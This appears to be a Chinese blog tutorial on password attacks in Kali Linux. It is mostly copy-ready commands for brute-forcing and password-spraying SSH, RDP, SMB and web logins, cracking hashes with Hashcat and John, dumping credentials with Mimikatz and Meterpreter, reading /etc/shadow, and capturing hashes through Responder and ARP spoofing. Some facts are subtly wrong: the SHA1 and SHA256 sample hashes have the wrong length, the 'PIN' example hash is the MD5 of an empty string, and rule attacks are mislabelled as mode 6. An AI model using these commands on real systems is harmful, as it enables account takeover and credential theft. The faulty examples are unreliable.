---
title: 密码攻击全攻略：从暴力破解到哈希破解
slug: kali密码攻击全攻略-k6f7g
date: 2026-08-30
visibility: public
tags: Kali Linux, 密码攻击, Hashcat, John, 渗透测试, 教程
---

# 密码攻击全攻略：从暴力破解到哈希破解

密码是信息系统最普遍的认证方式，也是攻击者最常攻击的弱点。本文介绍 Kali Linux 下的密码攻击技术，涵盖在线爆破、离线破解和哈希提取。

## 一、密码攻击类型

| 攻击类型 | 方式 | 工具 | 适用场景 |
|---------|------|------|---------|
| 暴力破解 | 逐个尝试所有组合 | Hydra、Medusa | 弱密码 |
| 字典攻击 | 用密码字典尝试 | Hashcat、John | 大批量破解 |
| 密码喷洒 | 用少量密码试多个账号 | Metasploit | 防锁定策略 |
| 彩虹表 | 预计算哈希查表 | RainbowCrack | LM/NTLM |
| 哈希破解 | 离线破解哈希值 | Hashcat、John | 获取哈希后 |

## 二、在线密码爆破

### 1. Hydra（九头蛇）

Hydra 是最流行的在线密码爆破工具，支持 50+ 协议。

```bash
# SSH 爆破
hydra -l root -P passwords.txt 192.168.1.100 ssh

# 多用户爆破
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh

# FTP 爆破
hydra -l admin -P passwords.txt 192.168.1.100 ftp

# HTTP 表单爆破
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# RDP 爆破
hydra -l administrator -P passwords.txt 192.168.1.100 rdp

# MySQL 爆破
hydra -l root -P passwords.txt 192.168.1.100 mysql

# SMB 爆破
hydra -L users.txt -P passwords.txt 192.168.1.100 smb
```

### Hydra 参数详解

| 参数 | 含义 |
|------|------|
| -l | 单个用户名 |
| -L | 用户名列表文件 |
| -p | 单个密码 |
| -P | 密码列表文件 |
| -t | 线程数（默认 16） |
| -f | 找到第一个就停止 |
| -v | 显示详细过程 |
| -s | 指定端口 |

### 2. Medusa

```bash
# SSH 爆破
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh

# RDP 爆破
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
```

### 3. 密码喷洒（防止账号锁定）

```bash
# 用 1 个密码尝试多个用户
hydra -L users.txt -p "Winter2026" 192.168.1.100 ssh -f

# Metasploit 密码喷洒
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set SMBPass "Winter2026"
set VERBOSE false
run
```

## 三、密码字典

### 内置字典

Kali 预装了多套密码字典：

```bash
# 经典 wordlist
ls /usr/share/wordlists/

# rockyou.txt（最著名密码字典，1400万条）
gunzip /usr/share/wordlists/rockyou.txt.gz

# 查看行数
wc -l /usr/share/wordlists/rockyou.txt
```

### 自定义字典

```bash
# 使用 Cewl 从网站生成字典
cewl http://example.com -w custom_dict.txt

# 使用 mentalist 生成模式字典
mentalist

# 使用 crunch 生成特定模式密码
# 生成 6 位数字密码
crunch 6 6 0123456789 -o numeric.txt

# 生成 8 位字母+数字
crunch 8 8 -t admin@% -o pattern.txt
# @ = 小写字母, % = 数字
```

### 字典变形与合并

```bash
# 合并字典
cat dict1.txt dict2.txt > merged.txt

# 去重
sort merged.txt | uniq > unique.txt

# 添加常见后缀
hashcat --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule
```

## 四、离线哈希破解

### 1. Hashcat（GPU 加速）

Hashcat 是世界上最快的密码破解工具，支持 GPU 加速。

```bash
# 基本用法
hashcat -m 0 -a 0 hash.txt dictionary.txt

# 参数说明：
# -m 0    哈希类型（0 = MD5）
# -a 0    攻击模式（0 = 字典）
# hash.txt 哈希文件
# dictionary.txt 字典文件
```

### 哈希类型速查

| -m 值 | 哈希类型 | 示例 |
|-------|---------|------|
| 0 | MD5 | 827ccb0eea8a706c4c34a16891f84e7b |
| 100 | SHA1 | b89eaac7e61493c671f3e6c1c6c4c4c4 |
| 1400 | SHA256 | a665a45920422f9d417e4867efdc4fb8 |
| 1000 | NTLM | b4b9b02e6f09a9bd76077d8829360c4c |
| 1800 | SHA-512 (crypt) | $6$rounds=5000$... |
| 3200 | bcrypt | $2y$10$... |

### 攻击模式

```bash
# 字典攻击（模式 0）
hashcat -m 0 -a 0 hash.txt dict.txt

# 组合攻击（模式 1）- 两个字典组合
hashcat -m 0 -a 1 dict1.txt dict2.txt

# 掩码攻击（模式 3）- 纯暴力
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d
# ?d = 数字, ?l = 小写, ?u = 大写, ?s = 特殊, ?a = 全部

# 规则攻击（模式 6）- 字典+规则
hashcat -m 0 -a 0 hash.txt dict.txt -r best64.rule

# 增量模式（模式 6 暴力）
hashcat -m 0 -a 3 hash.txt --increment
```

### 实战示例

```bash
# 破解 MD5
echo "827ccb0eea8a706c4c34a16891f84e7b" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# 破解 NTLM
echo "b4b9b02e6f09a9bd76077d8829360c4c" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# 6 位数字 PIN 破解
echo "d41d8cd98f00b204e9800998ecf8427e" > hash.txt
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d

# 使用规则变换
hashcat -m 0 -a 0 hash.txt dict.txt -r /usr/share/hashcat/rules/best64.rule
```

### 2. John the Ripper

```bash
# 破解 /etc/shadow
unshadow /etc/passwd /etc/shadow > hash.txt
john hash.txt

# 用指定字典
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 指定格式
john --format=raw-md5 --wordlist=dict.txt hash.txt

# 显示已破解
john --show hash.txt

# 继续中断的会话
john --restore
```

## 五、哈希获取

### Windows 哈希

```bash
# Meterpreter 中
load kiwi
creds_all       # 抓取所有凭据
lsa_dump_sam    # 导出 SAM 哈希
lsa_dump_secrets

# 使用 Mimikatz
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

### Linux 哈希

```bash
# /etc/shadow 文件
cat /etc/shadow

# 使用 unshadow 组合
unshadow /etc/passwd /etc/shadow > hash.txt
john hash.txt
```

### 网络嗅探获取哈希

```bash
# 使用 Responder 捕获 NTLMv2 哈希
responder -I eth0 -wrf

# 使用 ettercap + SMB 捕获
ettercap -T -M arp /192.168.1.100// /192.168.1.1//
```

## 六、常见哈希识别

```bash
# 使用 hashid 识别哈希类型
hashid 'd41d8cd98f00b204e9800998ecf8427e'
# 输出可能：MD5, MD4, NTLM, LM 等

# 常见哈希特征：
# 32 位十六进制 → MD5, NTLM
# 40 位十六进制 → SHA1
# 64 位十六进制 → SHA256
# 以 $1$ 开头 → MD5 crypt
# 以 $2a$/$2y$ 开头 → bcrypt
# 以 $6$ 开头 → SHA-512 crypt
```

## 七、实战技巧

### 密码模式分析

```
中国人常见密码模式：
- 123456, 12345678
- p@ssw0rd, P@ss1234
- 姓名拼音+生日：zhangsan1990
- 键盘图案：qwerty, asdfgh
- 季节+年份：Winter2026, Spring2026
```

### 高效破解策略

```
1. 先用 rockyou.txt 跑一遍（覆盖 90% 弱密码）
2. 用规则变换（best64.rule）跑一遍
3. 用掩码暴力跑特定模式（如 ?d?d?d?d?d?d）
4. 社会工程学信息生成定制字典
5. 最后全空间暴力（时间极长，谨慎使用）
```

## 安全提醒

> 密码攻击技术请仅在授权环境下使用。在线爆破可能导致账号锁定，请谨慎操作。本文内容用于安全测试和学习。

## 小结

- 在线爆破用 Hydra，离线破解用 Hashcat
- rockyou.txt + best64.rule 能覆盖大部分弱密码
- 密码喷洒适合防锁定场景
- 先识别哈希类型再选择正确的 -m 参数
- GPU 加速让哈希破解速度提升 100 倍以上

> 下一篇我们将学习 Web 应用渗透测试，从 SQL 注入到 XSS 的全面实战。
